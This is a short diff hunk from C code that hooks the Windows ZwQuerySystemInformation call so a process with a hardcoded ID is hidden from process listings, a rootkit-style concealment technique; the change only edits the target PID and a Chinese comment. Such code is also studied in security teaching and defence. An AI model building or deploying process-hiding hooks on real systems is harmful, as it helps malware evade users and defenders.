@@ -96,8 +96,8 @@ NTSTATUS New_ZwQuerySystemInformation(
 {
 	NTSTATUS status = 0;
 	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
-	// 要隐藏的进程PID
-	DWORD dwHideProcessId = 96;
+	// ===== 要隐藏的进程PID =====
+	DWORD dwHideProcessId = 14752;
 
 	// UNHOOK API
 	UnhookApi();
